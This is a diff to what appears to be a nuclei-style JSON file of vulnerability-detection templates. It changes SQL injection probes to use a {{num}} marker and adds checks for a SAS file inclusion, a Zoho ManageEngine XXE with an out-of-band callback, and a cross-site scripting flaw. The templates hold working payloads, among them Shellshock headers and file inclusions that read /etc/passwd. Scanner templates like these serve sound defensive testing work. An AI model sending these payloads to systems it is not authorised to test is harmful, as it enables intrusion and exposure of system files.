@@ -3083,7 +3083,7 @@
       },
       "requests": [
         {
-          "body": "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5(1234567890)),1)%23]=bob&name[0]=a",
+          "body": "pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5({{num}})),1)%23]=bob&name[0]=a",
           "method": "POST",
           "path": [
             "{{BaseURL}}/?q=node&destination=node"
@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3965,7 +3965,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)"
+            "{{BaseURL}}/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5({{num}})),1)"
           ]
         }
       ]
@@ -5679,7 +5679,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(8888)),1)"
+            "{{BaseURL}}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5({{num}})),1)"
           ]
         }
       ]
@@ -6099,7 +6099,7 @@
       "requests": [
         {
           "raw": [
-            "POST /upload/index.php?route=extension/payment/divido/update HTTP/1.1\nHost: {{Hostname}}\n\n{\"metadata\":{\"order_id\":\"1 and updatexml(1,concat(0x7e,(SELECT md5(202072102)),0x7e),1)\"},\"status\":2}\n"
+            "POST /upload/index.php?route=extension/payment/divido/update HTTP/1.1\nHost: {{Hostname}}\n\n{\"metadata\":{\"order_id\":\"1 and updatexml(1,concat(0x7e,(SELECT md5({{num}})),0x7e),1)\"},\"status\":2}\n"
           ]
         }
       ]
@@ -10897,7 +10897,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/plus/ajax_street.php?act=alphabet&x=11�'%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{randstr}}),9%20from%20qs_admin#"
+            "{{BaseURL}}/plus/ajax_street.php?act=alphabet&x=11�%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5({{num}}),9%20from%20qs_admin#"
           ]
         }
       ]
@@ -10912,7 +10912,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5({{randstr}}),3%23%27"
+            "{{BaseURL}}/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5({{num}}),3%23%27"
           ]
         }
       ]
@@ -10927,7 +10927,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{randstr}}),5,6,7,8,9%23"
+            "{{BaseURL}}/plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{num}}),5,6,7,8,9%23"
           ]
         }
       ]
@@ -10942,7 +10942,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{randstr}}),9%23"
+            "{{BaseURL}}/plus/ajax_street.php?act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5({{num}}),9%23"
           ]
         }
       ]
@@ -14039,7 +14039,7 @@
         {
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
-            "GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5('CVE-2021-24750'),4--%20%22%7D HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5({{num}}),4--%20%22%7D HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -15305,7 +15305,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/api/experimental/patternfile?order=id%3Bselect(md5('nuclei'))&page=0&page_size=0"
+            "{{BaseURL}}/api/experimental/patternfile?order=id%3Bselect(md5({{num}}))&page=0&page_size=0"
           ]
         }
       ]
@@ -16650,6 +16650,21 @@
       ]
     },
     {
+      "id": "CVE-2021-41569",
+      "info": {
+        "name": "SAS 9.4 build 1520 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/broker?csftyp=classic,+ssfile1%3d/etc/passwd&_SERVICE=targetservice&_DEBUG=131&_PROGRAM=sample.webcsf1.sas&sysparm=test&_ENTRY=SAMPLIB.WEBSAMP.PRINT_TO_HTML.SOURCE&BG=%23FFFFFF&DATASET=targetdataset&_DEBUG=131&TEMPFILE=Unknown&style=a+tcolor%3dblue&_WEBOUT=test&bgtype=COLOR"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41648",
       "info": {
         "name": "PuneethReddyHC action.php SQL Injection",
@@ -16706,7 +16721,7 @@
         {
           "raw": [
             "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\nUSERNAME={{username}}&PASSWORD={{password}}&language=en&log=\n",
-            "POST /TransferredOutModal.php?modfunc=detail HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\nstudent_id=updatexml(0x23,concat(1,md5(1234)),1)&button=Save&TRANSFER[SCHOOL]=5&TRANSFER[Grade_Level]=5\n"
+            "POST /TransferredOutModal.php?modfunc=detail HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\nstudent_id=updatexml(0x23,concat(1,md5({{num}})),1)&button=Save&TRANSFER[SCHOOL]=5&TRANSFER[Grade_Level]=5\n"
           ]
         }
       ]
@@ -18567,7 +18582,7 @@
       "requests": [
         {
           "raw": [
-            "GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(\"{{randstr}}\"),1,2),NULL,NULL,NULL,NULL,NULL,NULL' HTTP/1.1\nHost: {{Hostname}}\n"
+            "GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5({{num}}),1,2),NULL,NULL,NULL,NULL,NULL,NULL' HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -18581,7 +18596,7 @@
       "requests": [
         {
           "raw": [
-            "POST /admin/asign-single-student-subjects.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=Press&roll_no=3&course_code=sd' UNION ALL SELECT CONCAT(md5(\"{{randstr}}\"),12,21),NULL,NULL,NULL,NULL#\n"
+            "POST /admin/asign-single-student-subjects.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsubmit=Press&roll_no=3&course_code=sd' UNION ALL SELECT CONCAT(md5({{num}}),12,21),NULL,NULL,NULL,NULL#\n"
           ]
         }
       ]
@@ -18597,6 +18612,25 @@
           "raw": [
             "POST /royal_event/ HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 353\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD\n\n------WebKitFormBoundaryCSxQll1eihcqgIgD\nContent-Disposition: form-data; name=\"username\"\n\n{{username}}\n------WebKitFormBoundaryCSxQll1eihcqgIgD\nContent-Disposition: form-data; name=\"password\"\n\n{{password}}\n------WebKitFormBoundaryCSxQll1eihcqgIgD\nContent-Disposition: form-data; name=\"login\"\n\n\n------WebKitFormBoundaryCSxQll1eihcqgIgD--\n",
             "POST /royal_event/btndates_report.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD\n\n------WebKitFormBoundaryFboH5ITu7DsGIGrD\nContent-Disposition: form-data; name=\"todate\"\n\n1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(\"{{randstr}}\"),0x1,0x2),NULL-- -\n------WebKitFormBoundaryFboH5ITu7DsGIGrD\nContent-Disposition: form-data; name=\"search\"\n\n3\n------WebKitFormBoundaryFboH5ITu7DsGIGrD\nContent-Disposition: form-data; name=\"fromdate\"\n\n01/01/2011\n------WebKitFormBoundaryFboH5ITu7DsGIGrD--\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-28219",
+      "info": {
+        "name": "Zoho ManageEngine ADAudit Plus - Unauthenticated XXE to RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "body": "[\n  {\n    \"DomainName\": \"{{Host}}\",\n    \"EventCode\": 4688,\n    \"EventType\": 0,\n    \"TimeGenerated\": 0,\n    \"Task Content\": \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><! foo [ <!ENTITY % xxe SYSTEM \\\"http://{{interactsh-url}}\\\"> %xxe; ]>\"\n  }\n]\n",
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/api/agent/tabs/agentData"
           ]
         }
       ]
@@ -18789,6 +18823,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-30777",
+      "info": {
+        "name": "Parallels H-Sphere - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index_en.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
